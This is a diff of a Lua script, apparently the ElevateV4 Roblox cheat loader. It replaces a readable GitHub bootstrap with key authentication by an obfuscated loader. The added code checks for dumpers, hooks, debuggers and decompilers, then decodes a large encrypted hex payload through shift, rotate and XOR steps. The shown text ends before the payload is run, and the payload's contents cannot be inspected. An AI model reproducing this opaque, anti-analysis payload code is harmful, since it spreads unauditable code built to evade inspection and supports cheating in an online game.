@@ -1,309 +1,101 @@
--- ElevateV4 GitHub bootstrap with key authentication.
-if shared.elevatedeveloper ~= nil then
-	shared.ElevateDeveloper = shared.elevatedeveloper
+local OlO0OO0IOO,lI0llIlII=pcall(function()
+  local IIIO0OIIlO00l=game and game:GetService("Players")
+assert(IIIO0OIIlO00l,"Invalid environment")
+local l0IOIl0IlO0IO=rawget(_G,"getgc")
+if type(l0IOIl0IlO0IO)=="function" then
+  local IO0O0OIOI0,IOlIll0O=pcall(l0IOIl0IlO0IO,false)
+  if IO0O0OIOI0 and type(IOlIll0O)=="table" and #IOlIll0O>50000 then error("Anti-dump") end
 end
-
-local Owner = "soryedforgive"
-local Repository = "ElevateV4"
-local Branch = "main"
-local Directory = shared.ElevateDeveloper and "elevatev4private" or "elevatev4"
-local RawBase = `https://raw.githubusercontent.com/{Owner}/{Repository}/{Branch}/`
-
--- Replace with your worker URL from: npx wrangler deploy
-local AUTH_URL = "https://keyauth.weikauth.workers.dev/auth"
-
-if not game:IsLoaded() then
-	game.Loaded:Wait()
+local I0I0IlII00OOI=rawget(_G,"hookfunction") or rawget(_G,"replaceclosure")
+assert(not I0I0IlII00OOI,"Hook detected")
+local OI0IOIO0I0lOI=rawget(_G,"getinfo") or rawget(_G,"debug")
+if type(OI0IOIO0I0lOI)=="table" and rawget(OI0IOIO0I0lOI,"getinfo") then error("Debug detected") end
+local IlI0OlIOOIO=rawget(_G,"newcclosure") or rawget(_G,"syn")
+if IlI0OlIOOIO and rawget(_G,"decompile") then error("Decompile detected") end
+  
+  local lO0I00lIOlIOI0=os.clock()
+  
+  -- junk
+  do
+  local OIlIOIlIlIO0={32,274}
+  local Oll0Ill0I0O0=rawequal(nil,false)
+  local ll0OlOI0IlI=rawequal(nil,false)
 end
-
-local HttpService = game:GetService("HttpService")
-local analyticsService = game:GetService("RbxAnalyticsService")
-local localPlayer = game:GetService("Players").LocalPlayer
-
-local isfile = isfile or function(Path)
-	local Ok, Result = pcall(readfile, Path)
-	return Ok and type(Result) == "string" and #Result > 0
+  
+  -- payload
+  local IIl0II0OIOl={"d69e880b82941116ddc11e2e9504d25b9f8408b2445350c255cc0c0a913d4910b5e6fb6dacf7ec76a4bcf67b23e1a97fb9a4aefd722aa3a0f671e36ffbed686fc81e990dd5498f928098919f8482131ac15ccb008e754b58de79cd14cd5b800939812802e96b7c723921bc222a3cb9be3c2051a3e17d30b83528ac1a669de8f0108c4a5292141b9784191d9b5d45821e169e048399028287d71144cd42cb0311a9717f42e3a9e076e5c9234af5f9b33a62397aa2b2a1adf8f468f0edaa7bb8ef090e480e0c119b5246458c9f07ed076ec9584fc3811c5a46ccfcd0cdc312834eb0a7bb6b29b53bb6af09e38a8cebe7a13691e7e4b23a6c26f7a0aab531ac646b4655daa2e79c4bc9c15dd15b1a8493","5e87018d41cfd1bd09d06eac35bc3ab37b69a179774a7c6be37e39202afa38206ae7296020dbb46c696f088ed59c5ad394564e58ddda405cecdb05561a024d361f76548d0dcbfc14d80eb9f4fa76ecfb70b67ceea7fe63bcf630a9d2fb929478ba63ff76611aa5ad236f20584f13098b90534798d2aaaf9493980f86061c1c350b99cd80d3d4118cc44fabe9b537aaadee47e4a7b1a5b23be4ce50e8b522ed3a2b23e16d20aef2f0f27988d3c817c3d45b511ed0d36bd56dc4eec99e0fc2c4d3c39891cb818e475b82ceae36bba9746a7d73617c71a18ca3e88ff7206a1239e1eb633631726aaa1d72a99fa10822a41c1fa7115c501ecbd2d99e1e1d05715c775a8187b9103abc0407bf79b539b728","686e236e3b2ca3a99fa10822a41c1fa71146d71a4542045e9f1959b34eb58087514881945355094fab283e362cf57169bc2220f461b9b33f373e2966ebb8bfa33f2d6d71bb6c2621154a4e131352d26651e9406aec54570096c1089d4d00c0d8571f120a453e540e66f0fa00abecaa37aff720e1f43922706fe7e5d2796bbd16efae2e9a1ca4a71f9921880c0c2591d286cfcc9a842dd4c19831584740d2d098d0c890398539944baea964f47b45ecc6f149e0ca4cf4f74fe925a927b8216bd6ad74bdf4baece5695f61c8e264dcdf67d1d8571b921bc4ee70c89a1cdcc242f6c179d08ecdd1920ba681bfac2232b2b7e72174fd72fb3321f9212f12e579b0a73437e77525ac65eb46cd4552131b53","191a065e4d0d8442cb143ec0787bc37dc56c4671c9604acc7477cf69d178526dd52d392927e5db65dd745e59e14862e45c5fe751e9406a55ed44df9f590c850a835c7641f9507afc4447ffb901a882bd05ac8608b03fba61b8b37b7d3b56bd64fa30e6f0eb1b9ae61d662956989b239d258ca6912980aa2c94972f893198b28d359cb638575d3bc63dbb90f9f17f3344e9adb3a0b7c8e56ab8b5a1a53ca553ae96fc5635ac6c743335675f890ed9e2154a5b13d94fc65fd51e87ee4974d4f7f6cc5858d47939d59012c57e7f7fbd833d852c063189200a8c34378f299138122d953c16982023b3faf229af8654d422671cd7888e5c514500990399c6080bb30db51c3601b9103abc0407bf79c16842","169820239b259d341e19a10822a41c1fa71146d71a454204489f980b700dd3cb46d593fe15cc52984e2833c3f5fbc56c46c87073cb75cd644e69d17852d46c6fd76177e15afaf2695e8687cbe3480b1d09169f406aec5457ef49f158724df55c76f84043fb45fd547eb90138f6b5ec61b03709a08ab50da48e10a8ab13ad15bc96a119b09a1cf538eede57d7d49d258ca62890932b952d84ae893198b2348c8f379e16400a9a3dbb90bff8336c62b0bda9e47dbfbc4cf4f74fe951f8d2ed55fcd658e0e35be55df4de484e54e2ccc9cad68e9dddea966d8811700ccb8212c242f6c179d0fa7cc4c77f398128023d852c068830338b358d2429f76e383abbb33a26be6cec1a669d282e1007045d9414","70a7ea7c6d2a3bb6e1fca6e3bceaa8beb8eeb812a2153c28a6e7251ba51db49e992188134b8dd851912980aac442951946d914c2ca43c3c09e16400ad384d08fa72efc72e8abec0548e021a2ab39b5fefc7e6460e723b0e7bf367735b0ede46916864a63424ad1e68f5d51448385d9c899df4f1e9d80ca4878d5ddca5aca4afe398128edabec6f6831a5f7bfa1bd750e5328fa237224bef0346c2c332d3129f34994e092c9140c59d710930445039351160448b24b0c1ac35408568d83bd143ec0adef6d6874fde86e7866ed7c2ae82339246ead6df9abe3acb0326522ab25314856d6d592c80e12049dd76a4ac2149fc45ddf5dd2c45a021049410b525b1601eeb1feedb1b5b168b6bfb38bfce2f5","e5ad26f6d54c4fd242909fd9034591dbc385489a9a818784cd75dcf678c0c37b9b0cd491e67428acb0ade0682038bcf4fd38b87a21b73e2d2d602aa7be2eae1a9c24279f19a108221da50c8918ce42daca42159f9d4f3087c0985ed814074f4c05bd143ec0787bc32caa7df1f7c9604acc25e83e2ea7293d7c62e2e1ae7fbceb3532742f0c8e98974a83c0e718869cdfc15c50de8419d40643190c835f470f0cfc4447ffa62e7832a205b8367ce12cfeb5cea462f9e4ae10bbfcba27bfe730f1ab6232201f52101cd61b8d26df9e1eaa2c94978118318c0219840b4338959d8a1a8a0abef941e8c244fcffee6e7dbdbea4243321a1b97fade1e560677eacb66d2ae4e75fd9d05f139a139d89999755","f158724df55c76f84043ced15349cf28afbf33fa7460a8eea7bd66e5f8b2711025fa6779bb6bf9efae2e9a1ca4a71f992188a29d258c92c6c0079a8452d95a98818503c58ccc3749894054d4cc010f342ca56c62457f05f1c960cafc6be64f21e1283cbca469672c34bd747a5d23aad90e9e0dd35adf67d169c0ead56d950144998c05cd75dcf6c179d0fa7cc4c77fec31b46d337585e939a5637e64e0290e7c6529a2617d2f39bea9e7b5317265eb11181591ddcc5c880e181199ac854940584fc48c43f71cc35651034f910c8990a674b442f42caf292038603a206373bfd0bd3be76dfb2da274d9adb46df036df4dce945603955bd797401d5cd3ed446e49f15872f44c4ff741cc000eda0349ce","e6203eea38b83e21fc2b62f222a2162199301a9c24273188a1159009140a5316105068152dd8db9d1f8f03340c1a5950d64f4c05bd143ec0787bc37dc56c466ee6b0fa237462bb377e2fe37cd53f56ade23c6b70ed62a0d98a09569a52d0581f289c14546d02d986484bf34df55c7641f9507afc1ad6ffac75fe2de2b4bd86b82fa20b75f83820f6bee963142faf13a1eca62b3aaa2a9e20989b239d258ca6912980aa2c94975bd8c4c5c6123581c296dfdc8a948a0abef941e8c244fcff47f149e07b6abcbbb850e8eb53ed55fcd6b036e16d2ae4e75fd9d05f139a13cce668d08d1ad5c3189f979e890c841ec6d955c8000f1a09864dbf2cafacac2b3bb7e5b6fc3af86a237ae2bf69a0a2602ee3","84ae9e198b5c52c09c5fd009474b8d53593f2635e837afb1bde939fea4fb6ae3757f3da4bed227afefd7f4e96035b4ddf4f114d8ced1c9d41b97dfce9085c245865bdc0e495cd2c400487853807b4588848e2630a80271226ee876ff200a358d240e90287ae7b9baa0e8a13027abe974322e94a48a2242159b88d941c75e9ac3d80196b14e06b45290c2515646cb8a3d5289b6787bc37d74fbb736bf3f3ccc7477cf76fea8e272d5e9e7acb43df4fafaa2a1598c1916d0028088512a409e855d53810ec11a069d1b5b76c18c010ec81a989036f4ba773dbbf3f008b0b30beb7ca4e176e4b8ffa5387bb97e769fb4a532289ed5ca8f929348ddd2458757c5929404ec89b14447199b0b87b88096d5d4","6d635df4de60d8db63dd141b92d142c7ea0085c8dfdcdf4543c1c5c118789e5c7b92cd4350a830f4f7fbad616860bd20fbea3aba0e90282b932d953c16219930b4ed24322d0d100e4e4c4a5cd3068542474558129009c25b3234d81ac35fd6c1ba0592883eac296473686bf1f77d797da4cc3734cfe95178a77364ebe1ae6063db65dd745e59e14862e45c5fe751d997054043d3db410fcdf34df55c7641f9507afc44474e26f0f7f4bd05ac8608b0b30bb50da48ef760b8fd3bb9afb1757ee1afe829e5ea20c804d29d49dd49c1dcd6df9d98c7da97b3cf0298058a48b80b974f5a4cc251a8752f42fafceaa9a026bfbcf54de4ce50e8eb53ed55fcd6e159f0da6c3b78aa870e95539a13cce668d0","c411a8c346f6a323afb6a0b8e674f5b8f27f3faf6d53ed55fce7b1f6a1a5bb3bb7ae88904acf8dcbd118d69755da4a9c9b988e07cfdd449cd077d78ccd0e09cc488b2ee86a837e85fdb66e38a2233d21fb3ebde46e227c6bbcf06d3537b774e9a9b0c910889c139a0088c119172a45c254c1021d5583d9994d429417c08bbc47078e296e39c0b474716a79e4e665a57c62cee5a16afabb3c70657477a06ea96ce82b4e880a631352d2898ed91085ec4b88df191e4c9d1d470d02f80343ca155205fc70b0b5aeb5282aa961b8a60ab9e2f43ca13c7f93e36ad3b971a9a776f3f4f5ae0d9616151bca5b96988f9385415cd241d831dbb29a581e999e889095113d050b2f28eeed222aea2aa1bcf674fb","eb62e25661d970f4ad64f8f04ce19f4c5dcad066878f46ebc15c989a969e84c3f493dbf7ded64d7ad14c888a2f276fb2326d7b77e309bd64bd2bf079a911b892ad15bc96f77f73abbaf1a32ecb90142002c24f099fa9aa038a9c191ec5d9c033c5808158810dc1ce49d5133fac2e7473ad75fa7638efa23475f3bbb8e951f8d254ecef57f4e92cf46a68a47095d699d29fdb9390d169c0ea6cd4d76f5dc0c547591a838078c0c37b9412c549bf36b602843c3f68eeb970e5357c753ebf397a6222952da6342930d99c30f72f064e0ec40850100a19848605c51c8348c596f7db05dcd046504610dc1048081271ecee6dad746b46e578bcbee3eba37ee6b9afa33f6b2320d86063db3bac7431861448","4862e45c5fe751e940c4c4edd3410548868713000d519ff94d944ddb0089b901a882bd05ac8608b0b30bb50da48ea911b892e1fc3ff8f066e6f571ac286bde11cb8d82949d59914f57da5398c7da978fc7c48d359cb63880833b853d94bef941e8c2f563eef07749e0caf54de4ce50e8eb53ede4ebe2b0ee6eda5ce4e75fd961c8e2dd65cce668d0d39e851dd35f46df4fc6c558da8948c98615948cd3fee6e7abfc313531e87f3ebe0a8c34378f299138122d953ca7f73164ed259d341e19a1082215830e10971e9e2a15ad042eb0080b1d9cb5dc5f5117078b4d04447c79c568b76374fbf1be7073cb75cd644e69d17852d425f0e334ad21b635a92531155693cc024a1a935d595d845213d1ef49","968f8c7cc4c77f39812802723a2ca8bc30a23be178757a29642ea2fb2cf0f87026a0a86ab2a3afa00e0e56098c5dd3119950c543c0179a57440e1d58401cd908559c8b1b13830f7945e446c4e82e732478bcbfa17afa4ed0686bd36dd57ce92ed920afdcbbf8ef08e14e57434b9c88e880038455dd14db9d4058871ad890025416061594fd830a00e9a9b26db0b1a92509f6e538a1e77ff7feee67ffab3b216ea0a31ba51db49e99ce5f9294839f80c1dba8850a1dd9da44d914c6841a41d99e16c04b0884c43ffbf676c2fd45ecc648f0f3a42a7db421e93da9e6e1f3fa63e19af0e8b6ea6ade60d8db63dd65cc090e5990056c43869ddc170f82cdb6dc32cf46c37bc57dd4fe39813f2db46c2087","08871c5e5c9bd79f43541592067ee9f4b533aba8aa33be097d3aebf8a43e10f774bcfc7aa1e921a7efec1ca4a71f992188a29d258ca65cc1869e0142dbd8893198b2348c8f37d056810d033d94be40f8fb43fdaa3bf6a1a6f425fca6a63b6b77aee233ab7cfcf1ffb22eb5a8a575d9c75f97d4c38196d1479158576d44ee0f47cb861241c1829f1601048d94d2cfb62e7936e935fdb7367e74fd358d240e29913812617cfbb9aeac60b4306376af62565cd51da50c2611a9002ad845021a9dde47440db51c36099f120c830c83cf3eb737347b337f2be5e67cfaa47d79ffd0b63a616de1ab56746867eb28bbf32a599519dd0c171d56e800cc1a554214c0d68e4fc7444cdfd85417500b1b92457eae","b1fbf1be7073cb757cf3bf2ea72724d46c6fd77ef6a0ea7adda3701f58cf5289119b09855840a9ec40875f561e5e061c4101c7cc554cfb974aca7eb901a88204bcbfaa25e6a049b5a5f163f663e67fbaeae3e0a119b09a1ca4a71fce90954c42d48c6528109f0c59c00451ce4798b2348c8f378139fe0bd5ccc5ca74f8b8432f6f6cee2e26fd7b23e1b8a2bba5a952a655bfd6d8b0f7affaf3246ecccf1f8d5b420b484ee99315921bc4ee70c8cb73cd7534d9d0cbd0397cd2d28a2dad7976a82bfcb70aa6ffaca224b33ef66069eca6f27e25215a302ef5e962ea55ce4a1112a51a134f5800e9acc5465a1f844ec3030b1b3689505c0a057e14bee970797774e8ab47227767fdf3cd644ed03b2564","ed8c21cba28915dc49c79e1a9a801d925189b1cf025bd21e8655cc17d45112033efebf7d43fd45ec68604977e5b9f4a0ff76ff696339a0d3f8583f775bf0efe86fd7c6988dca4d8e53c4849118c0d3c49db3c84b47d8018a9910f9d00f929558c8bf8128023d852c068861a7ffeaf9228e607e696724397efa241b30afba2da4f111180e8c1dd15d9600a9579ac34a861edd449f5cd99a8b36c994dc14059442cb6f74f83d443238b171c9604a24a275f9a62fedd36dd57cb9bee920b5dc6d36ef86101945831a4cc158cf0d9a04d9596e0af1444244535009570c4d8e894cc80bae68ea7c2b2983e1b8b870a5fde5b80fbfe4a56661a420e3b670f2e4a5bae4f1c750d996d191ced58497dfdc952d","1f45d89e82848401079e168c0b4884d750e8416873e2f47176bda1664ee139b2bbb9a4a95254337b5761e8e76b70ede96f15dd5bd45b8a1bd68186c086dc015fdf1dc0d831cd85ca038dd417f90a42484eecfef9ac71226af764bd717ee5a2b3fb21b73eecfdba6b29f3beed752db074a0cbcd59d6c2915ad387844118da9fec5a59dec8dc07c31f00870e8e854abd808f34672bf32cc5b1e8642760f8e321e3cfbcfee47c3ca17cfbb47763aaf1f223dc598e5490e489cb57ced857dbc1ed55df045794410a834b599149477a54094a1972ac3c65bdc6ac06e6a5a6ff618f63b177a0ea22a1b9b16874a8e6b4f5a8a9705f4d4457439410921ed8d1df13c4c2da97b1c7c4ca43cac7381f5cce850c","52cbc8f941e8c244fcff47a03d7ce561b36467bfb97ee3f8e469d36359adb5ec74f8eed9941fe249d49c176845821f01c313814684ca07745d5b589e79f954d09b898effb87534bb852c063138b7fb3bb2378f2991ada3b9a16a39f720609ba82ca82a478e9fa095c84ad71f29411edbac84d1b0888b0d4ac3434001b9103a53dbd70f66c1406d226a3ab324206625750e64bebb382e2665bc7af8f56b236571a9a32f4e470ad792d59bc90e475d151946421f0e8758724df54b59c8105cfb13c9bbcf6cac743370bcfc072e26bd8aeb393520fff9a53b72baeb38b4f5e06ff2eae069992188a2820a5c16c7905b9b45c3d55f048004869a531037c2393e8e128c491374a96f43ad2afdc671c9e0e5","38f463feb9a0697cf2e4fafe77bfbcf5f0b1a42bc7df9794d35adf67d169969bd5cb1889c11d86479c01dcd95579f84a4cda968eb430b43663aabb06fb7333e664f9f8a0f6fe38e77a7db020a799301a259d341ea007c4934d4a0c4f4107179b5d1454afdb0247440db51c36b80003bb1a92c48e66c1866db4a87f0471fb33fdf37afa4ed0686bd36dd57ce92ed9642e6d7037ab08e159ccc9549c93c7c40d5a81edd4dfd8dec4c3f4985a47d50c061594fd89517466ea77690570a9b13977e53ce1237bf87ea592bc3a61f9f77ff3ea71aa2a9e992188a2249c9f98de29171b009c18ae44d85b828d008a189e88908a48d5d7caa72e39c2e8abbdc67ca0acfaf5b9b4bab83ee5d22533f0a6b02d77","dc531c139ac95adff21d13d086900dd0545a7d06172eac6ab328aab0b43e893038656aa33ef964ef667f26fb27287f72af356234eecb485e5615cc0a88851b531501d9d35f1e175a871d4a1cc6d350464e0dd41290ed733b7d2df1b0f73da46334753db6a737a5296221b3fb6532e667f4f5a9242a4e098f1352e55c545847dcdbdc41889b1b429f43185b80864b4052d4028b547eb90101ed30e92bb63826b77be479a2e73fb7baa239abe3e0f076a12d6ae321a0d6211c13490a9bd399904d9ac7af849e9780489c349bd107d0564c0b85c8c4ceafa9fbbde8f4fb77e5667c3f4c60a6f0b8a3a9e2a3aafc23b6b17c5bb5b2e3de880e55e250038a1301d81c15d598d25f1fc81fc358c4cdf650d7","c74b03834190e6b178ed3d627a3639afe73a354e2471a6ee383de02cfd2466ef2735f52d231ed14d8493080bdb4911dd511e830b821edf004acc43028236b8000354da8d44d179f5bff7b0ac2ef3710a607832bb644ed0686bd36dd513f8b168e76e6debb16e0b1e17145de54c66e85053eb845c595f189ec58c4ac39bc7d5574c8f8ed305ccffff3d03bd05ac86b109a0bbbda166be3664be2c22bcab276df0b6aa73ace661de5788a2249c9f279129ab831a1954da9e9c9e185384ce49c64f90ba3c84873ff941342cad31bd373724233fabb9f9e537e0aa2de36aef57e159f0dae55d2830d04c8a9252ccdb5744d9dd5b01d101de9b8e8784cd75dcf6cb87457bc57dd48fe6f528297b3caa876f","5011a9002a0285179e58440e0753441cc356519c0c83bd143e79c16842c463a0f721266065ab3264e0216828d379e52cb97e27a1eb297ab271485f17145de54c66e85053eb0b9c444197f1081d054c1106410c46cbdafdc8cff5ed2f6cbdf07bb2a47df6e53dbae9fee711e9fdbca2229618a0a3aa3aecebe8992188a250cd8a920546801a0a9d931cc5d65b07418400c3df09c13815d59217e6efb9ade8e3fd38f6b775fa6abcbbb8ae27effd64bcf05735696c74f1a8da6fd2d8986349d410c9ce1c91ccdd86d9d18e07878482cadcda569ed77b95c8c910392fb9023423ab366178720a653839e021b73e3dfd2521a730992df432f027ab4895d48cc2ca0cd85d410c1a018298db09c5498d051e","93558c801600184045c1ed59dc041945021d000cc8418a137a7c51178fa6b02882a8ebfde9bf36b30bb50da48ea911afbd24fcb0fbbea9e22b319f9a30104695a3578c9b1704999d1b8794df9a9cdf980319414bc2380083440a3d89912db4746c2b2df133a07dfce56a79b5b17cfdbba6b861d4f9f0e8b664eb62e75fd961c8e2dd65d1565c0e5c5e85c3d9108bc09a4cc34acf77c179d0fac57d484f756dafec7af32c06318971657d73b138af9138122d3bad16f7ff369b342d29ae96955512944dcb93115c169b8a1a9a2eb0080bb30db51c9890b98c8b8810d8d0ad70ef6e687571f3fcb8ac3a24cd278d69d4f490d4797166fe6eee5a65dd745ee0585be35de54c53019dd7946c9e1e001884","7d763330c87073cb75cd644e69d17852d46c6fd761d9705aadf223aa0f094e524ce58aa5512d1f1cec5457ef49f158724df55c76f84043fb149245c93f01a88204bcbf07b109a08ab5bc337faeef2d13ad15bc96a119b02b73b5e069de5788a29d258ca6289046c5cbc2d5ae411ecf46dbdd9a86903993ba455b43ce74f8ea6cba33ecc6f149e0ca4cf4f74fe951e562397b7be3e8bef6a5abea6aded961c8e264dcdfd64e989f9c921bc4ee70c8cb73cd759b49c1544c548995c70b68b575ed28b12c29e7302665648d73be77fe38e77ab87e2730996675253264710e894a9708a5db5200189c55acc388405bb14f82999b1cc3565144cd05bd143e79c168427b337fb220bdbce4aaa264fee46835","fbf9e4e9ff11e3f0a7ff763024abfae2ae91074f92d3","bcb9202cb97e68615ae97a36b05950d5d3c9574c17464f02eb805d986ed84045421a1d5ef71196417a9089028bf5e9247cfa73ac86b109a08a0cb426203d1156bd3db32b67a9b2ac1b3332249ec74e880cd0ccc15345d76e850519c2aec157cc458d359cb6813990ba3c84873fe66e3872e24578777ca5ecbef58ee4a2b865a53da13825313e295eb5f4ece675d75edb63dd65cce6d169c0ea6cd4891ec91d89c6989ac1f6c85fd27b49cc084b2674af25aa3c2a6960e67f7c358d240e90282b932d953c162199301a73fbf72f06a1dd5643505d01861050ab019d54c1164fc5461a195ec65f5641c505dbc34ebf752bb7ac7471b971a5317e796b62b0a1feefa73cba61626627e5db65dd745e59e1","11160f56004c8384984359440e8c4ac31c36b80003bb05bd143e79c16842c47c7fc771c9604a75cd323fd0bfb5d33dba6d56746b6ceb22acb8b04c50df97895b4ca52b50d3df40991201987158c29b5d4fdf9e964dcbda08887e73fbbb83b801a104b16e777f0c3d68ba36e03892b8fbedf9af26a31ba51db49e992188a2249c9f27912980aa952d84ae30888b338d350cc2d089460d4a84873ff941e8c2fd45ecc648f0f34bf54de4cee951f8d254bd70a6a62ff0dae55df4de60d8db63dd65cce6d169c0ea6cd4d76fc9718e83cdddc103c99fd78ec57ed4ba39743eb3eb7bb9873189200a358d240e90282b932d953c162199301a9c24279f19a108d74d91da599d404d5e1ba983aa4cb19e321c","72f74fe951effd3de5ebd67f3eec5b69ec286bc694c82164c80fd7ce86c69e84ddd59fded79a8ccd998c03dfc78f8c7cc4c77fad3035b7a9ea2c21a63063e4248d39bc3d203e7e25f87a78342730d9669db42a558c45cccc250c968e58006ac045c31a164418b10db14340099f120c830a8ad1a6f138adc4ed2aa8a13c3665eacdcd21e43dff62e4fa6ba730ad76b66c7179611e9748625de55b49d8004ceb9d58d81a189e4572374ccf77068f507a45fdc55174b877b26caafde9a409f6e50c60a27bf77e69ed7cbaec6328beadf7f5e8a26199a1a2c91bd751a7df299185d25b84ae30888b338d35b403154dc1d5c984c43f31f474b6ac2af1c68bb3f3cb754db4a1f8512c6365b3be38f45927ae","f9a677fe2a3c39bf612868932922a2162199301a9c242770c69158cd1d88db5286418783ca1893db0972189d041911c85e1787c4520d0616efe7ab76e9b13d296420b77fa36ba87f78e57f52adb3ab26ec2e24ad22ab745e59e14862e45ccec8c5e96b6a16ed0891f08594879344c05e9e4cc78ffc5598483f01a882bd05ac8608b0b30bb5f8f4ba776e6466a47930e930ac27aab0b363f1ded6dc559d258ca6912980aa2c94972f893198b258dbca598980964fd08c944f26f676c244fcff47f149e0caf54de4ce50e8eb53ed55fc393e69a0355c72382f8f0ed953cf658fe60f81c19e434254594f71d8f274cccf77c179d0fac57dd4fe80383b833de27df424eff77a8cfa748f6d26a6a5ab953c","f821a5bd60fefc28b56d67ebfbf2e5aa1f4c4b57c3d1918d4f98d2d5d98682df86314482199b80431ed1d185c24bc5d1e8ffb7b4f37ab0f8f16e7c6424e3737ebfe8a2bcbc20ac23b034fdda2c3b38aa0d945452c9655c57870f066bdbd8534116808e83da9ddec94ece4e54547d43d17538ef6d6df17df7be2037bbf964223e2020a5a332ba20a7ec20367574f26b6819a108224bc3cf170ea9919f8a9d19809f970bda5c40ccd80f5540cf524a40c979c168427dc56c46bc21667ee1a2647f397e29d032797a23a8686da4e96da936508c0ae3d29a4c8a011c5695ec41c35a184f07044df55c7649df524cc34aca7eb901a86d2b6cefe8b1aef0e5eb7cf5bae57f75ecadb2ecf9ff68e1aee9a9f6","ad34b43b34fd7360b837fff2fa383b7965ee66b83e6a27aaa0e01b712d28308dd4a61396db1916c0dc511b0a5882104fc19482188581075788c2baff84530f6deff4372bf4be713e3b3a34217d7860fda4d3fce5beef94e16d20aebba9e9f8d18a9c150cd4d1d780065d14d25b1cded6c04542d8c474438dde928ac5bed40bad3479b5f2e82137a53831757c62757b203d7afe28b36da4215a302eacb0796b0c8759905ad3638898418c9f44d22a9f5bb15b3280dc9b19154c3e8b570a8a89b66cab73622a6a3724a6b0bf62abe8312766e6526dd57cffb7b436af34b4a3b14850d49c148e5649c558909f8a9916ddcf5cdfdcdc5b4bc7950916cd8a4447ffb934342ca8b43d28e7e1bdfb67e4f2fa","d36bd56dc4eec971899d858b49c04779d0fac57dd4fe80383b833d6afb36616620e73ca0e63e3c917b123da755b8ec71f36efae966add6939c934b4c0a098418149a004357de078e0bb30db51c3601b9103abc044ed0ad74f4f37175f0f7a7657d2625b9b5ff7c6f2724d46c6fd761d9705a65dd745e1508cb0c0c9a1a098558dc9f12c2889f9d0e584041454198f80343971412048be774f96eb4a9a1f8b1e4f0fe64bcb98ed3a8a6a33924ed63f2a7efec1ca4a71f992188a2cc4a9d115ed7152b952d84ae8931980d8b8c0686940986badb52850fb4a964b2ac2af1c6aef977643da523bae9e06f2779fbade258303c3435e868aa880ed50dd653dfcfd15d975aca82c4db5f5c15c25975c0d91e"}
+local llIOIOOIOl0O={1,19,12,30,7,22,23,9,3,24,2,17,13,25,16,33,32,18,10,20,21,11,34,15,31,5,29,4,26,28,14,8,6,27}
+local Ill0IO0lOI0l={}
+for llIlI0l0=1,#llIOIOOIOl0O do Ill0IO0lOI0l[llIlI0l0]=IIl0II0OIOl[llIOIOOIOl0O[llIlI0l0]] end
+local lIl0l00OO0O0lI=table.concat(Ill0IO0lOI0l)
+  
+  repeat
+  local ll0IOI0OIlO0=rawequal(nil,false)
+  local OO0lIlIII0=math.max(447,90)-math.min(447,90)
+until true
+  
+  -- checksum
+  local OllllIlO0IO=0
+  local OOlIIlO0O0IOII=999983
+  local OI0I0IIlIlOl0l0=257523
+  for OlI0l0l0O00l=1,#lIl0l00OO0O0lI do
+    OllllIlO0IO=(OllllIlO0IO+string.byte(lIl0l00OO0O0lI,OlI0l0l0O00l))%OOlIIlO0O0IOII
+  end
+  assert(OllllIlO0IO==OI0I0IIlIlOl0l0,"Integrity check failed")
+  assert(os.clock()-lO0I00lIOlIOI0<10,"Debug detected")
+  
+  -- hex to bytes
+  local function OIl0IO0IIOIO0I(h) return tonumber(h,16) end
+  local IO0OII00IIll={}
+  for OlI0l0l0O00l=1,#lIl0l00OO0O0lI,2 do
+    IO0OII00IIll[#IO0OII00IIll+1]=OIl0IO0IIOIO0I(string.sub(lIl0l00OO0O0lI,OlI0l0l0O00l,OlI0l0l0O00l+1))
+  end
+  
+  -- vm decode
+  local lIlIO0O0lIl={{t="SC",k=math.abs(-160)},{t="SH",k=math.floor(math.sqrt(1444))},{t="RO",k=(99 - 93)},{t="XR",k="lI0OlI0OIllI"}}
+local lIlIIlIO=1
+while lIlIIlIO<=#lIlIO0O0lIl do
+  local lIIOO0IOIl0l=lIlIO0O0lIl[lIlIIlIO]
+  if lIIOO0IOIl0l.t=="SH" then
+    local lt={}
+    for OlI0l0l0O00l=1,#IO0OII00IIll do lt[OlI0l0l0O00l]=(IO0OII00IIll[OlI0l0l0O00l]-lIIOO0IOIl0l.k)%256 end
+    IO0OII00IIll=lt
+  elseif lIIOO0IOIl0l.t=="RO" then
+    local lt={} local lk=lIIOO0IOIl0l.k local lm=bit32.lshift(1,lk)
+    for OlI0l0l0O00l=1,#IO0OII00IIll do
+      local lb=IO0OII00IIll[OlI0l0l0O00l]
+      lt[OlI0l0l0O00l]=(bit32.rshift(lb,lk)+bit32.lshift(lb%lm,8-lk))%256
+    end
+    IO0OII00IIll=lt
+  elseif lIIOO0IOIl0l.t=="XR" then
+    local lk=lIIOO0IOIl0l.k local lkl=#lk local lt={}
+    for OlI0l0l0O00l=1,#IO0OII00IIll do
+      local lki=(OlI0l0l0O00l-1)%lkl+1
+      lt[OlI0l0l0O00l]=bit32.bxor(IO0OII00IIll[OlI0l0l0O00l],string.byte(lk,lki))
+    end
+    IO0OII00IIll=lt
+  elseif lIIOO0IOIl0l.t=="SC" then
+    local ls=lIIOO0IOIl0l.k local lt={}
+    for OlI0l0l0O00l=1,#IO0OII00IIll do
+      lt[OlI0l0l0O00l]=bit32.bxor(IO0OII00IIll[OlI0l0l0O00l],(ls+OlI0l0l0O00l-1)%256)
+    end
+    IO0OII00IIll=lt
+  end
+  lIlIIlIO=lIlIIlIO+1
 end
-
-local function EnsureFolder(Path)
-	local Current = ""
-	for Segment in string.gmatch(Path, "[^/]+") do
-		Current = Current == "" and Segment or `{Current}/{Segment}`
-		if not isfolder(Current) then
-			makefolder(Current)
-		end
-	end
+  
+  if math.pi > 3 then
+  local OOOIIIl0lOI=0
+  for IIO0Ill0=1,4 do OOOIIIl0lOI=OOOIIIl0lOI+1 end
 end
-
-local function EnsureParent(Path)
-	local Parent = Path:match("^(.*)/[^/]+$")
-	if Parent then
-		EnsureFolder(Parent)
-	end
-end
-
-for _, Folder in {Directory, `{Directory}/games`, `{Directory}/profiles`, `{Directory}/assets`, `{Directory}/libraries`, `{Directory}/guis`} do
-	EnsureFolder(Folder)
-end
-
--- Resolve key: check License table (teleport re-exec), then all env sources, then saved file.
-local License = ... or {}
-local function resolveKey()
-	local sources = {
-		License.Key,
-		getgenv().script_key,
-		getgenv().ElevateKey,
-		_G.script_key,
-		shared.script_key,
-		shared.ElevateV4Key,
-	}
-	for _, v in sources do
-		if type(v) == "string" then
-			local trimmed = v:match("^%s*(.-)%s*$")
-			if trimmed and #trimmed > 0 then
-				return trimmed
-			end
-		end
-	end
-	if isfile(`{Directory}/profiles/script_key.txt`) then
-		local body = readfile(`{Directory}/profiles/script_key.txt`)
